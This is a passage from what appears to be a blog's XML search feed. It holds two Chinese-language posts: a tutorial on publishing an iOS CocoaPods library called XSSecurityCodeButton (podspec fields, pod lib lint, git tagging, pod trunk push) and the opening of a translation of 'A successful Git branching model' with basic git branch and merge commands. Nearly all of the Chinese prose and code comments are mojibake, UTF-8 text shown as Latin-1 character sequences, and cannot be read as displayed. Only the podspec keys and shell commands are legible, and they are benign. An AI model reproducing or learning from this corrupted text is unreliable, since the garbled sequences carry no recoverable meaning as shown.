README.mdåº“çš„ä½¿ç”¨ä»‹ç»æ–‡ä»¶ï¼Œå¦‚ä½•åˆ›å»ºè¯·è‡ªè¡Œç™¾åº¦/è°·æ­Œï¼Œéžå¸¸ç®€å•ã€‚ XSSecurityCodeButton.podspecCocoaPodsçš„æè¿°æ–‡ä»¶ åˆ›å»º.podspec è¿›å…¥ä½ éœ€è¦åˆ¶ä½œå¼€æºåº“çš„é¡¹ç›®æ ¹ç›®å½• ç»ˆç«¯æ‰§è¡Œä¸‹é¢çš„æŒ‡ä»¤ï¼Œä¼šåœ¨ä½ çš„ä»“åº“ä¸‹ç”Ÿæˆ XSSecurityCodeButton.podspecæ–‡ä»¶ 12345// XSSecurityCodeButton æˆ‘çš„é¡¹ç›®åç§°ï¼Œè¯·è‡ªè¡Œä¿®æ”¹pod spec create XSSecurityCodeButton// æ‰§è¡Œå®Œæˆç”Ÿæˆä¼šè¾“å…¥å¦‚ä¸‹ä¿¡æ¯Specification created at XSSecurityCodeButton.podspec XSSecurityCodeButton.podspecæ–‡ä»¶é…ç½®åŠä¿®æ”¹è¯·å‚è€ƒä¸‹é¢ï¼ˆå·²åˆ é™¤éƒ¨åˆ†æ— ç”¨çš„å¹²æ‰°å†…å®¹ï¼‰ï¼Œé‡è¦çš„åœ°æ–¹æˆ‘å·²ç»ç»™å‡ºæ³¨é‡Šã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Pod::Spec.new do |s| # â€•â€•â€• Spec Metadata â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€• # s.name = "XSSecurityCodeButton" s.version = "0.0.1" # ç‰ˆæœ¬å· ä¸Ž ä½ ä»“åº“çš„ æ ‡ç­¾å· å¯¹åº” s.summary = "XSSecurityCodeButton æ˜¯ä¸€ä¸ªç®€çº¦çš„éªŒè¯ç æŒ‰é’®." s.description = &lt;&lt;-DESC # è¿™é‡Œçš„æè¿°ï¼Œå¿…é¡»æ¯”s.summaryçš„é•¿åº¦è¦é•¿ã€‚ DESC s.homepage = "https://github.com/SevenCho/XSSecurityCodeButton" # ä½ çš„æºç é¡µ # s.screenshots = "www.example.com/screenshots_1.gif", "www.example.com/screenshots_2.gif" # â€•â€•â€• Spec License â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€• # s.license = "MIT" # å¼€æºè¯ä¹¦ # s.license = &#123; :type =&gt; "MIT", :file =&gt; "FILE_LICENSE" &#125; # â€•â€•â€• Author Metadata â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€• # s.author = &#123; "åº“å‘å¸ƒè€…" =&gt; "é‚®ç®±" &#125; # Or just: s.author = "åº“å‘å¸ƒè€…" # s.authors = &#123; "åº“å‘å¸ƒè€…" =&gt; "é‚®ç®±" &#125; s.social_media_url = "https://sevencho.github.io" // ä½ çš„ä¸ªäººç½‘é¡µï¼Œå¦‚æžœæœ‰çš„è¯ # â€•â€•â€• Platform Specifics â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€• # # s.platform = :ios s.platform = :ios, "8.0" # å¹³å°åŠæ”¯æŒçš„æœ€ä½Žç‰ˆæœ¬ # â€•â€•â€• Source Location â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€• # s.source = &#123; :git =&gt; "https://github.com/SevenCho/XSSecurityCodeButton.git", :tag =&gt; "#&#123;s.version&#125;" &#125; # ä½ çš„ä»“åº“åœ°å€ï¼Œä¸èƒ½ç”¨SSHåœ°å€ # â€•â€•â€• Source Code â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€• # s.source_files = "XSSecurityCodeButton", "XSSecurityCodeButton/**/*.&#123;h,m&#125;" # ä½ ä»£ç çš„ä½ç½®ï¼Œ XSSecurityCodeButton/*.&#123;h,m&#125; è¡¨ç¤º XSSecurityCodeButton æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰çš„.hå’Œ.mæ–‡ä»¶ # s.exclude_files = "Classes/Exclude" # å¯æ‰§è¡Œæ–‡ä»¶ # s.public_header_files = "Classes/**/*.h" # å…¬å…±å¤´æ–‡ä»¶ # â€•â€•â€• Resources â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€• # # s.resource = "icon.png" # æ³¨æ„ï¼šå¦‚æžœä½ çš„ä»£ç é‡ŒåŒ…å«xibæ–‡ä»¶ï¼Œxibå±žäºŽèµ„æºæ–‡ä»¶ï¼Œéœ€è¦resourceå¼•å…¥ã€‚ # s.resources = "Resources/*.png" # s.preserve_paths = "FilesToSave", "MoreFilesToSave" # â€•â€•â€• Project Linking â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€• # # s.framework = "SomeFramework" s.frameworks = "UIKit", "Foundation" # æ”¯æŒçš„æ¡†æž¶ # s.library = "iconv" # s.libraries = "iconv", "xml2" # â€•â€•â€• Project Settings â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€•â€• # s.requires_arc = true # éœ€è¦ARCæ”¯æŒ # s.xcconfig = &#123; "HEADER_SEARCH_PATHS" =&gt; "$(SDKROOT)/usr/include/libxml2" &#125; # s.dependency "JSONKit", "~&gt; 1.4"end éªŒè¯ .podspec æ–‡ä»¶çš„æ ¼å¼æ˜¯å¦æ­£ç¡® åˆ›å»ºå®Œæˆ.podspecæ–‡ä»¶å¹¶æŒ‰ç…§ä¸Šé¢é…ç½®å®Œæˆï¼ŒæŽ¥ä¸‹æ¥æˆ‘ä»¬å°±éœ€è¦æ–‡ä»¶å†…å®¹åŠæ ¼å¼æ˜¯å¦æ­£ç¡®ã€‚ ç»ˆç«¯æ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤ï¼š 1pod lib lint éªŒè¯é€šè¿‡å°±ä¼šè¾“å…¥å¦‚ä¸‹ä¿¡æ¯ 1XSSecurityCodeButton passed validation. å¦‚æžœä½ çš„é¡¹ç›®æºç è¢«éªŒè¯å‡ºæœ‰è­¦å‘Šä¿¡æ¯ï¼Œä¼šè¾“å‡ºå«æœ‰å¦‚ä¸‹å†…å®¹çš„ä¿¡æ¯ 1(but you can use `--allow-warnings` to ignore them). æ­¤æ—¶ä½ åªéœ€è¦åœ¨éªŒè¯æŒ‡ä»¤åŽé¢åŠ ä¸Šå¯¹åº”çš„æç¤ºï¼Œé‡æ–°éªŒè¯ä¸€é 1pod lib lint --allow-warnings ç»™ä»“åº“æ‰“æ ‡ç­¾ éªŒè¯æˆåŠŸåŽï¼Œå°±éœ€è¦å°†ä»“åº“æäº¤åˆ°è¿œç¨‹ï¼Œç„¶åŽç»™ä»“åº“æ‰“ä¸Šæ ‡ç­¾å¹¶å°†æ ‡ç­¾ä¹ŸæŽ¨é€åˆ°è¿œç¨‹ã€‚ æ ‡ç­¾ç›¸å½“äºŽæ˜¯ä½ çš„ä»“åº“çš„ä¸€ä¸ªåŽ‹ç¼©åŒ…ï¼Œç”¨äºŽç¨³å®šå­˜å‚¨å½“å‰ç‰ˆæœ¬ã€‚ æ ‡ç­¾å·ä¸Žä½ åœ¨ s.version = â€œ0.0.1â€çš„ç‰ˆæœ¬å·ä¸€è‡´0.0.1 1234// åˆ›å»ºæ ‡ç­¾git tag -a 0.0.1 -m &apos;æ ‡ç­¾è¯´æ˜Ž&apos; // æŽ¨é€åˆ°è¿œç¨‹git push origin --tags å‘å¸ƒ.podspec å‘å¸ƒé¡¹ç›®çš„æè¿°çš„æ–‡ä»¶, åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ‰§è¡Œ 1pod trunk push XSSecurityCodeButton.podspec è¿™ä¸€æ­¥ä¼šæ‰§è¡Œå¦‚ä¸‹æ“ä½œï¼š æ›´æ–°æœ¬åœ° pods åº“ ~/.cocoaPods.repo/master éªŒè¯.podspecæ ¼å¼æ˜¯å¦æ­£ç¡®-.podspec æ–‡ä»¶è½¬æˆ JSON æ ¼å¼ å¯¹masterä»“åº“ è¿›è¡Œåˆå¹¶ï¼Œæäº¤.masterä»“åº“åœ°å€ å‘å¸ƒæˆåŠŸåŽè¾“å…¥å¦‚ä¸‹å†…å®¹ï¼š 12345678Updating spec repo `master`-------------------------------------------------------------------------------- ðŸŽ‰ Congrats ðŸš€ XSSecurityCodeButton (0.0.1) successfully published ðŸ“… June 26th, 04:13 ðŸŒŽ https://cocoapods.org/pods/XSSecurityCodeButton // ä½ å‘å¸ƒçš„cocoapodsä»“åº“ä¿¡æ¯ï¼Œå¯åœ¨æµè§ˆå™¨æ‰“å¼€æŸ¥çœ‹ ðŸ‘ Tell your friends! ä½¿ç”¨ä»“åº“ å…ˆæ›´æ–°æœ¬åœ°podsä»“åº“ä¿¡æ¯ æ›´æ–°å®Œæˆæœ¬åœ°ä»“åº“åŽå°±å¯ä»¥æœç´¢ä½¿ç”¨æˆ‘ä»¬è‡ªå·±å‘å¸ƒçš„cocoapodsä»“åº“äº† å°±å¯ä»¥åœ¨éœ€è¦çš„é¡¹ç›®çš„Podfileæ·»åŠ ã€ä½¿ç”¨è‡ªå·±çš„ä»“åº“äº† 123pod setup // æ›´æ–°pod search XSSecurityCodeButton // æœç´¢pod &apos;XSSecurityCodeButton&apos;, &apos;~&gt; 0.0.1&apos; // éœ€è¦ä½¿ç”¨çš„é¡¹ç›®çš„Podfileæ–‡ä»¶ä¸­æ·»åŠ åŽå®‰è£…ï¼Œå’Œä½¿ç”¨å…¶ä»–ä¸‰æ–¹åº“ä¸€æ · æ›´æ–°ç»´æŠ¤ å½“æˆ‘ä»¬ç»´æŠ¤ä¿®æ”¹äº†æˆ‘ä»¬çš„æºç æ–‡ä»¶åŽå°±éœ€è¦é‡æ–°å‘å¸ƒä¸€ä¸ªæ–°çš„ç‰ˆæœ¬åˆ°cocoapods é¡¹ç›®æºç æ‰“ä¸Šå¯¹åº”çš„æ ‡ç­¾æŽ¨é€åˆ°è‡ªå·±çš„è¿œç¨‹ä»“åº“ æ›´æ–°XSSecurityCodeButton.podspecä¸­ç‰ˆæœ¬å·ï¼ˆå’Œæ–°çš„æ ‡ç­¾ä¸€è‡´ï¼‰ é‡æ–°æ‰§è¡Œpod trunk push XSSecurityCodeButton.podspec --allow-warningsæŽ¨é€å‘å¸ƒåˆ°podsä»“åº“]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>CocoaPods</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸€ä¸ªæˆåŠŸçš„åˆ†æ”¯æ¨¡åž‹]]></title>
    <url>%2Farchives%2F33f710d8.html</url>
    <content type="text"><![CDATA[æˆ‘æ˜¯ä¸ªä¿—æ°”è‡³é¡¶çš„äººï¼Œè§å±±æ˜¯å±±ï¼Œè§æµ·æ˜¯æµ·ï¼Œè§èŠ±ä¾¿æ˜¯èŠ±ã€‚å”¯ç‹¬è§äº†ä½ ï¼Œäº‘æµ·å¼€å§‹ç¿»æ¶Œï¼Œæ±Ÿæ½®å¼€å§‹æ¾Žæ¹ƒï¼Œæ˜†è™«çš„å°è§¦é¡»æŒ ç€å…¨ä¸–ç•Œçš„ç—’ã€‚ä½ æ— éœ€å¼€å£ï¼Œæˆ‘å’Œå¤©åœ°ä¸‡ç‰©ä¾¿é€šé€šå¥”å‘ä½ ã€‚â€”â€”çŽ‹å°æ³¢ã€Šçˆ±ä½ å°±åƒçˆ±ç”Ÿå‘½ã€‹ å‰è¨€ æœ¬æ–‡ç¿»è¯‘è‡ªâ€œA successful Git branching modelâ€ è‹±æ–‡åŽŸæ–‡è¯·ç‚¹å‡»æ­¤å¤„æŸ¥çœ‹ æ­£æ–‡ åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å°†å±•ç¤ºæˆ‘ä¸€å¹´å‰æ›¾ç»ä»‹ç»è¿‡çš„ç”¨äºŽæˆ‘éƒ¨åˆ†é¡¹ç›®ï¼ˆæ— è®ºæ˜¯åœ¨å·¥ä½œè¿˜æ˜¯ç§äººï¼‰çš„å¼€å‘æ¨¡å¼ï¼Œå¹¶ä¸”å·²ç»è¯æ˜Žæ˜¯éžå¸¸æˆåŠŸçš„ã€‚æˆ‘æœ‰å†™è¿™ç¯‡æ–‡ç« çš„æ‰“ç®—å·²ç»å¾ˆä¹…äº†ï¼Œä½†ç›´åˆ°ä»Šå¤©æˆ‘æ‰æœ‰æ—¶é—´å½»åº•çš„å®Œæˆå®ƒã€‚æˆ‘ä¸ä¼šè°ˆè®ºå…³äºŽé¡¹ç›®çš„ä»»ä½•ç»†èŠ‚ï¼Œä»…ä»…è®¨è®ºå…³äºŽåˆ†æ”¯ç­–ç•¥å’Œå‘å¸ƒç®¡ç†ã€‚ ä¸ºä»€ä¹ˆgitï¼Ÿ å…³äºŽä¸“ä¸šäººå£«çš„å…¨é¢è®¨è®ºä»¥åŠGitå’Œé›†ä¸­çš„æºä»£ç æŽ§åˆ¶ç³»ç»Ÿçš„åˆ©å¼Šæ¯”è¾ƒï¼Œè¯·çœ‹è¿™é‡Œã€‚é‚£æ˜¯ä¸€ä¸ªå……æ»¡äº†ç¡çƒŸçš„æˆ˜åœºã€‚ä½œä¸ºå¼€å‘äººå‘˜ï¼Œå¦‚ä»Šæˆ‘å–œæ¬¢Gitè¦è¿œè¶…å…¶ä»–å·¥å…·ã€‚GitçœŸæ­£çš„æ”¹å˜äº†å¼€å‘äººå‘˜æƒ³è¦åˆå¹¶å’Œæž„å»ºåˆ†æ”¯çš„æ–¹å¼ã€‚æˆ‘ä»Žç»å…¸çš„CVS / Subversionä¸–ç•Œä¸€è·¯èµ°æ¥ï¼Œåˆå¹¶/åˆ†æ”¯ä¸€ç›´è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå¯æ€•çš„ï¼ˆâ€œåˆå¹¶å†²çªè¦å°å¿ƒï¼Œä»–ä»¬ä¼šå’¬ä½ ï¼â€ï¼‰è€Œä¸”è¿™äº›äº‹ä½ ä»…ä»…å¶å°”åšä¸€æ¬¡ã€‚ ä½†æ˜¯ä½¿ç”¨Gitï¼Œè¿™äº›æ“ä½œéžå¸¸ç®€æ´å’Œé«˜æ•ˆï¼Œå®ƒä»¬ä¹Ÿè¢«ç§°ä½œæ—¥å¸¸å·¥ä½œæµç¨‹çš„æ ¸å¿ƒéƒ¨åˆ†ä¹‹ä¸€ã€‚ä¾‹å¦‚ï¼Œåœ¨CVS / Subversion ä¹¦ç±ä¸­ï¼Œåˆ†æ”¯å’Œåˆå¹¶å°†åœ¨åŽé¢çš„ç« èŠ‚ï¼ˆé«˜çº§ç”¨æˆ·ï¼‰ä¸­ä¼˜å…ˆè®¨è®ºï¼Œè€Œåœ¨ æ¯ä¸€æœ¬ Git ä¹¦ä¸­ï¼Œå®ƒå·²ç»åœ¨ç¬¬3ç« ï¼ˆåŸºç¡€çŸ¥è¯†ï¼‰ä¸­è®¨è®ºè¿‡ã€‚ ç”±äºŽå…¶ç®€å•æ€§å’Œé‡å¤æ€§ï¼Œåˆ†æ”¯å’Œåˆå¹¶ä¸å†æ˜¯ä»¤äººå®³æ€•çš„äº‹æƒ…ã€‚ç‰ˆæœ¬æŽ§åˆ¶å·¥å…·å¯ä»¥å¸®åŠ©å¿«é€Ÿçš„è¿›è¡Œåˆ†æ”¯/åˆå¹¶ã€‚ å·¥å…·åˆ°æ­¤ä¸ºæ­¢ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹å¼€å‘æ¨¡åž‹ã€‚æˆ‘åœ¨è¿™é‡Œå±•ç¤ºçš„æ¨¡åž‹æœ¬è´¨ä¸Šåªæ˜¯ä¸€ç³»åˆ—çš„æ­¥éª¤ï¼Œæ¯ä¸ªå›¢é˜Ÿæˆå‘˜éƒ½å¿…é¡»éµå¾ªè¿™äº›è¿‡ç¨‹æ¥å®žçŽ°å¯ç®¡ç†çš„è½¯ä»¶å¼€å‘è¿‡ç¨‹ã€‚ åˆ†æ•£ä½†é›†ä¸­ æˆ‘ä»¬ä½¿ç”¨çš„ï¼Œä¸”ä¸Žè¿™ä¸ªåˆ†æ”¯æ¨¡åž‹é…åˆè‰¯å¥½çš„ä»“åº“ï¼Œä»–æœ‰ä¸€ä¸ªâ€œçœŸæ­£â€çš„ä¸­å¤®ä»“åº“ã€‚æ³¨æ„ï¼Œè¿™ä¸ªåº“åªæ˜¯è¢«è®¤ä¸ºæ˜¯ä¸­å¤®ä»“åº“(å› ä¸ºGitæ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼çš„ç‰ˆæœ¬æŽ§åˆ¶å·¥å…·ï¼Œåœ¨æŠ€æœ¯å±‚é¢æ²¡æœ‰æ‰€è°“çš„ä¸­å¤®ä»“åº“)ã€‚æˆ‘ä»¬å°†ä¼šä¸ºè¿™ä¸ªä»“åº“èµ·åä¸ºoriginï¼Œå› ä¸ºæ‰€æœ‰çš„Gitç”¨æˆ·å¯¹è¿™ä¸ªåå­—éƒ½æ¯”è¾ƒç†Ÿæ‚‰ã€‚ æ¯ä¸ªå¼€å‘è€…ä»Žoriginæ‹‰å–å’ŒæŽ¨é€ä»£ç ã€‚é™¤äº†é›†ä¸­å¼çš„æŽ¨é€æ‹‰å–å¤–ï¼Œæ¯ä¸ªå¼€å‘è€…ä¹Ÿå¯ä»¥ä»Žåˆ«çš„å¼€å‘è€…å¤„æ‹‰å–ä»£ç ï¼Œç»„æˆä¸€ä¸ªå­å›¢é˜Ÿã€‚ä¾‹å¦‚å½“ä¸Žä¸¤ä¸ªæˆ–è€…æ›´å¤šçš„äººå¼€å‘ä¸€ä¸ªå¤§çš„åŠŸèƒ½æ—¶ï¼Œåœ¨å°†ä»£ç æŽ¨é€åˆ°originä¹‹å‰ï¼Œè¿™ç§ä»£ç ç®¡ç†æ¨¡å¼å°†éžå¸¸æœ‰ç”¨ã€‚åœ¨ä¸Šå›¾ä¸­ï¼Œå­˜åœ¨Aliceå’ŒBobï¼ŒAliceå’ŒDavidï¼ŒClairå’ŒDavidä¸‰ä¸ªå­å›¢é˜Ÿã€‚ æŠ€æœ¯ä¸Šè€Œè¨€ï¼Œè¿™åªä¸è¿‡æ„å‘³ç€Aliceå®šä¹‰äº†ä¸€ä¸ªè¿œç¨‹Gitä»“åº“ï¼Œèµ·åä¸ºbobï¼Œå®žé™…ä¸ŠæŒ‡å‘Bobçš„ç‰ˆæœ¬åº“ï¼Œåä¹‹äº¦ç„¶(Bobå®šä¹‰äº†ä¸€ä¸ªè¿œç¨‹Gitä»“åº“ï¼Œèµ·åä¸ºaliceï¼Œå®žé™…ä¸ŠæŒ‡å‘Aliceçš„ç‰ˆæœ¬åº“)ã€‚ ä¸»åˆ†æ”¯ åœ¨æ ¸å¿ƒåœ°æ–¹ï¼Œå½“å‰å¼€å‘æ¨¡åž‹å—åˆ°äº†å·²å­˜åœ¨æ¨¡åž‹çš„å¾ˆå¤§å¯å‘ã€‚é›†ä¸­å¼çš„ç‰ˆæœ¬åº“æœ‰ä¸¤ä¸ªæ°¸ä¹…å­˜åœ¨çš„ä¸»åˆ†æ”¯ï¼š masteråˆ†æ”¯ developåˆ†æ”¯ originçš„masteråˆ†æ”¯æ¯ä¸ªGitç”¨æˆ·éƒ½å¾ˆç†Ÿæ‚‰ã€‚å¹³è¡Œçš„å¦å¤–ä¸€ä¸ªåˆ†æ”¯å«åšdevelopåˆ†æ”¯ã€‚ æˆ‘ä»¬è®¤ä¸ºorigin/masterè¿™ä¸ªåˆ†æ”¯ä¸ŠHEADå¼•ç”¨æ‰€æŒ‡å‘çš„ä»£ç éƒ½æ˜¯å¯å‘å¸ƒçš„ã€‚ æˆ‘ä»¬è®¤ä¸ºorigin/developè¿™ä¸ªåˆ†æ”¯ä¸ŠHEADå¼•ç”¨æ‰€æŒ‡å‘çš„ä»£ç æ€»æ˜¯ååº”äº†ä¸‹ä¸€ä¸ªç‰ˆæœ¬æ‰€è¦äº¤ä»˜åŠŸèƒ½çš„æœ€æ–°çš„ä»£ç å˜æ›´ã€‚ä¸€äº›äººç®¡å®ƒå«â€œæ•´åˆåˆ†æ”¯â€ã€‚å®ƒä¹Ÿæ˜¯è‡ªåŠ¨æž„å»ºç³»ç»Ÿæ‰§è¡Œæž„å»ºå‘½ä»¤çš„åˆ†æ”¯ã€‚ å½“developåˆ†æ”¯ä¸Šçš„ä»£ç è¾¾åˆ°äº†ä¸€ä¸ªç¨³å®šçŠ¶æ€ï¼Œå¹¶ä¸”å‡†å¤‡å‘å¸ƒæ—¶ï¼Œæ‰€æœ‰çš„ä»£ç å˜æ›´éƒ½åº”è¯¥åˆå¹¶åˆ°masteråˆ†æ”¯ï¼Œç„¶åŽæ‰“ä¸Šå‘å¸ƒç‰ˆæœ¬å·çš„tagã€‚å…·ä½“å¦‚ä½•è¿›è¡Œè¿™äº›æ“ä½œï¼Œæˆ‘ä»¬å°†ä¼šè®¨è®º å› æ­¤ï¼Œæ¯æ¬¡ä»£ç åˆå¹¶åˆ°masteråˆ†æ”¯æ—¶ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªäººä¸ºå®šä¹‰çš„æ–°çš„å‘å¸ƒäº§å“ã€‚ç†è®ºä¸Šæ¥è®²ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬åº”è¯¥éžå¸¸ä¸¥æ ¼ï¼Œå½“masteråˆ†æ”¯æœ‰æ–°çš„æäº¤æ—¶ï¼Œæˆ‘ä»¬åº”è¯¥ä½¿ç”¨Gitçš„é’©å­è„šæœ¬æ‰§è¡Œè‡ªåŠ¨æž„å»ºå‘½ä»¤ï¼Œç„¶åŽå°†è½¯ä»¶æŽ¨é€åˆ°ç”Ÿäº§çŽ¯å¢ƒçš„æœåŠ¡å™¨ä¸­è¿›è¡Œå‘å¸ƒã€‚ è¾…åŠ©æ€§åˆ†æ”¯ ç´§é‚»masterå’Œdevelopåˆ†æ”¯ï¼Œæˆ‘ä»¬çš„å¼€å‘æ¨¡åž‹é‡‡ç”¨äº†å¦å¤–ä¸€ç§è¾…åŠ©æ€§çš„åˆ†æ”¯ï¼Œä»¥å¸®åŠ©å›¢é˜Ÿæˆå‘˜é—´çš„å¹¶è¡Œå¼€å‘ï¼Œç‰¹æ€§çš„ç®€å•è·Ÿè¸ªï¼Œäº§å“çš„å‘å¸ƒå‡†å¤‡äº‹å®œï¼Œä»¥åŠå¿«é€Ÿçš„è§£å†³çº¿ä¸Šé—®é¢˜ã€‚ä¸åŒäºŽä¸»åˆ†æ”¯ï¼Œè¿™äº›è¾…åŠ©æ€§åˆ†æ”¯å¾€å¾€åªè¦æœ‰é™çš„ç”Ÿå‘½å‘¨æœŸï¼Œå› ä¸ºä»–ä»¬æœ€ç»ˆä¼šè¢«åˆ é™¤ã€‚ æˆ‘ä»¬ä½¿ç”¨çš„ä¸åŒç±»åž‹åˆ†æ”¯åŒ…æ‹¬: ç‰¹æ€§åˆ†æ”¯ Releaseåˆ†æ”¯ Hotfix åˆ†æ”¯ ä¸Šè¿°çš„æ¯ä¸€ä¸ªåˆ†æ”¯éƒ½æœ‰å…¶ç‰¹æ®Šç›®çš„ï¼Œä¹Ÿç»‘å®šäº†ä¸¥æ ¼çš„è§„åˆ™ï¼šå“ªäº›åˆ†æ”¯æ˜¯è‡ªå·±çš„æ‹‰å–åˆ†æ”¯ï¼Œå“ªäº›åˆ†æ”¯æ˜¯è‡ªå·±çš„ç›®æ ‡åˆå¹¶åˆ†æ”¯ã€‚ ä»ŽæŠ€æœ¯è§’åº¦çœ‹ï¼Œè¿™äº›åˆ†æ”¯çš„ç‰¹æ®Šæ€§æ²¡æœ‰æ›´å¤šçš„å«ä¹‰ã€‚åªæ˜¯æŒ‰ç…§æˆ‘ä»¬çš„ä½¿ç”¨æ–¹å¼å¯¹è¿™äº›åˆ†æ”¯è¿›è¡Œäº†å½’ç±»ã€‚ä»–ä»¬ä¾æ—§æ˜¯åŽŸGitåˆ†æ”¯çš„æ ·å­ã€‚ åŠŸèƒ½åˆ†æ”¯ åŠŸèƒ½åˆ†æ”¯å¯ä»¥ä»Ždevelopåˆ†æ”¯æ‹‰å–å»ºç«‹ï¼Œæœ€ç»ˆå¿…é¡»åˆå¹¶ä¼šdevelopåˆ†æ”¯ã€‚ç‰¹æ€§åˆ†æ”¯çš„å‘½åï¼Œé™¤äº† masterï¼Œ developï¼Œ release-*ï¼Œæˆ–hotfix-*ä»¥å¤–ï¼Œå¯ä»¥éšä¾¿èµ·åã€‚ åŠŸèƒ½åˆ†æ”¯(æœ‰æ—¶å€™ä¹Ÿæˆä¸»é¢˜åˆ†æ”¯)ç”¨äºŽå¼€å‘æœªæ¥æŸä¸ªç‰ˆæœ¬æ–°çš„ç‰¹æ€§ã€‚å½“å¼€å§‹ä¸€ä¸ªæ–°ç‰¹æ€§çš„å¼€å‘æ—¶ï¼Œè¿™ä¸ªç‰¹æ€§æœªæ¥å°†å‘å¸ƒäºŽå“ªä¸ªç›®æ ‡ç‰ˆæœ¬ï¼Œæ­¤åˆ»æˆ‘ä»¬æ˜¯ä¸å¾—è€ŒçŸ¥çš„ã€‚åŠŸèƒ½åˆ†æ”¯çš„æœ¬è´¨ç‰¹å¾å°±æ˜¯åªè¦ç‰¹æ€§è¿˜åœ¨å¼€å‘ï¼Œä»–å°±åº”è¯¥å­˜åœ¨ï¼Œä½†æœ€ç»ˆè¿™äº›åŠŸèƒ½åˆ†æ”¯ä¼šè¢«åˆå¹¶åˆ°developåˆ†æ”¯(ç›®çš„æ˜¯åœ¨æ–°ç‰ˆæœ¬ä¸­æ·»åŠ æ–°çš„åŠŸèƒ½)æˆ–è€…è¢«ä¸¢å¼ƒ(å®ƒåªæ˜¯ä¸€ä¸ªä»¤äººå¤±æœ›çš„è¯•éªŒ) åŠŸèƒ½åˆ†æ”¯åªå­˜åœ¨å¼€å‘è€…æœ¬åœ°ç‰ˆæœ¬åº“ï¼Œä¸åœ¨è¿œç¨‹ç‰ˆæœ¬åº“ã€‚ åˆ›å»ºåŠŸèƒ½åˆ†æ”¯ å½“å¼€å§‹å¼€å‘ä¸€ä¸ªæ–°åŠŸèƒ½æ—¶ï¼Œä»Ždevelopåˆ†æ”¯ä¸­åˆ›å»ºåŠŸèƒ½åˆ†æ”¯ 12$ git checkout -b myfeature developSwitched to a new branch "myfeature" åœ¨developåˆ†æ”¯æ•´åˆå·²ç»å¼€å‘å®Œæˆçš„åŠŸèƒ½ å¼€å‘å®Œæˆçš„åŠŸèƒ½å¿…é¡»åˆå¹¶åˆ°developåˆ†æ”¯ï¼Œå³æ·»åŠ åˆ°å³å°†å‘å¸ƒçš„ç‰ˆæœ¬ä¸­ã€‚ 12345678$ git checkout developSwitched to branch 'develop'$ git merge --no-ff myfeatureUpdating ea1b82a..05e9557(Summary of changes)$ git branch -d myfeatureDeleted branch myfeature (was 05e9557).$ git push origin develop 